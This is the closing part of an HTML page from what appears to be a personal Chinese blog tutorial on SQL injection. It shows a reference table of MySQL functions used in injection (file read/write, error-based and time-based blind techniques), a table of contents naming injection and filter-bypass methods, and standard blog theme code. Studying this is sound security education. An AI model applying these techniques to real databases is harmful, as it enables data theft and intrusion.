+<td style="text-align:center">load_file()</td>
+<td style="text-align:center">读取本地文件</td>
+</tr>
+<tr>
+<td style="text-align:center">into outfile</td>
+<td style="text-align:center">写文件</td>
+</tr>
+<tr>
+<td style="text-align:center">ascii()</td>
+<td style="text-align:center">字符串的ASCII代码值</td>
+</tr>
+<tr>
+<td style="text-align:center">ord()</td>
+<td style="text-align:center">返回字符串第一个字符的ACSCII值</td>
+</tr>
+<tr>
+<td style="text-align:center">mid()</td>
+<td style="text-align:center">返回一个字符串的一部分</td>
+</tr>
+<tr>
+<td style="text-align:center">substr()</td>
+<td style="text-align:center">返回一个字符串的一部分</td>
+</tr>
+<tr>
+<td style="text-align:center">length()</td>
+<td style="text-align:center">返回字符串的长度</td>
+</tr>
+<tr>
+<td style="text-align:center">left()</td>
+<td style="text-align:center">返回字符串的最左边几个字符</td>
+</tr>
+<tr>
+<td style="text-align:center">floor</td>
+<td style="text-align:center">返回小于或等于x的最大整数</td>
+</tr>
+<tr>
+<td style="text-align:center">rand</td>
+<td style="text-align:center">返回0和1之间的随机数</td>
+</tr>
+<tr>
+<td style="text-align:center">extractvalue()</td>
+<td style="text-align:center">第一个参数：XML document是String格式，为XML文档对象的名称，文中为Doc 第二个参数：XPath string（Xpath格式的字符串） 作用：从目标XML中返回包含所查询值的字符串</td>
+</tr>
+<tr>
+<td style="text-align:center">updatexml()</td>
+<td style="text-align:center">第一个参数：XML document是String格式，为XML文档对象的名称，文中为Doc 第二个参数：XPath string（Xpath格式的字符串） 第三个参数：new value String格式，替换查找到的符合条件的数据 作用：改变文档中符合条件的节点的值</td>
+</tr>
+<tr>
+<td style="text-align:center">sleep()</td>
+<td style="text-align:center">让此语句运行N秒钟</td>
+</tr>
+<tr>
+<td style="text-align:center">if()</td>
+<td style="text-align:center">SELECT IF(1&gt;2.2.3) -&gt; 3 类似三目运算</td>
+</tr>
+<tr>
+<td style="text-align:center">char()</td>
+<td style="text-align:center">返回整数ASCII代码字符组成的字符串</td>
+</tr>
+<tr>
+<td style="text-align:center">STRCMP()</td>
+<td style="text-align:center">比较字符串内容</td>
+</tr>
+<tr>
+<td style="text-align:center">IFNULL()</td>
+<td style="text-align:center">假如参数1不为NUL,则返回值为参数1,否则其返回值为参数2</td>
+</tr>
+<tr>
+<td style="text-align:center">exp()</td>
+<td style="text-align:center">返回e的x次方</td>
+</tr>
+</tbody>
+</table>
+</div>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/web/" rel="tag"><i class="fa fa-tag"></i> web</a>
+          
+            <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag"><i class="fa fa-tag"></i> SQL注入</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/06/03/GKCTF2020wp/" rel="next" title="GKCTF2020wp">
+                <i class="fa fa-chevron-left"></i> GKCTF2020wp
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/06/06/sqlmap%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/" rel="prev" title="sqlmap相关命令">
+                sqlmap相关命令 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/blog.png"
+                alt="SCERush" />
+            
+              <p class="site-author-name" itemprop="name">SCERush</p>
+              <p class="site-description motion-element" itemprop="description">基本上人生就算努力也不见得会有回报，一旦有所回报时，就当作是奇迹发生吧。</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#基础知识"><span class="nav-number">1.</span> <span class="nav-text">基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#注释"><span class="nav-number">1.1.</span> <span class="nav-text">注释</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL注入原理"><span class="nav-number">2.</span> <span class="nav-text">SQL注入原理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL注入分类及判断"><span class="nav-number">3.</span> <span class="nav-text">SQL注入分类及判断</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#联合查询注入"><span class="nav-number">4.</span> <span class="nav-text">联合查询注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#盲注"><span class="nav-number">5.</span> <span class="nav-text">盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#基于bool的盲注"><span class="nav-number">5.1.</span> <span class="nav-text">基于bool的盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#基于时间的盲注"><span class="nav-number">5.2.</span> <span class="nav-text">基于时间的盲注</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#报错注入"><span class="nav-number">6.</span> <span class="nav-text">报错注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL注入绕过"><span class="nav-number">7.</span> <span class="nav-text">SQL注入绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#大小写绕过"><span class="nav-number">7.1.</span> <span class="nav-text">大小写绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#双写绕过"><span class="nav-number">7.2.</span> <span class="nav-text">双写绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#编码绕过"><span class="nav-number">7.3.</span> <span class="nav-text">编码绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#内联注释绕过"><span class="nav-number">7.4.</span> <span class="nav-text">内联注释绕过</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#一般步骤"><span class="nav-number">8.</span> <span class="nav-text">一般步骤</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#HTTP头中的SQL注入"><span class="nav-number">9.</span> <span class="nav-text">HTTP头中的SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#HTTP头中的注入介绍"><span class="nav-number">9.1.</span> <span class="nav-text">HTTP头中的注入介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HTTP-User-Agent注入"><span class="nav-number">9.2.</span> <span class="nav-text">HTTP  User-Agent注入</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#绕过去除特定字符的SQL注入"><span class="nav-number">10.</span> <span class="nav-text">绕过去除特定字符的SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#去除注释符"><span class="nav-number">10.1.</span> <span class="nav-text">去除注释符</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#去除and和or"><span class="nav-number">10.2.</span> <span class="nav-text">去除and和or</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#去除空格"><span class="nav-number">10.3.</span> <span class="nav-text">去除空格</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#宽字节注入"><span class="nav-number">11.</span> <span class="nav-text">宽字节注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#基础"><span class="nav-number">11.1.</span> <span class="nav-text">基础</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#扩展"><span class="nav-number">11.2.</span> <span class="nav-text">扩展</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#二次注入"><span class="nav-number">12.</span> <span class="nav-text">二次注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MySQL注入常用函数"><span class="nav-number">13.</span> <span class="nav-text">MySQL注入常用函数</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">SCERush</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">21.9k</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+  
+
+
+  
+
+  
+
+</body>
+</html>
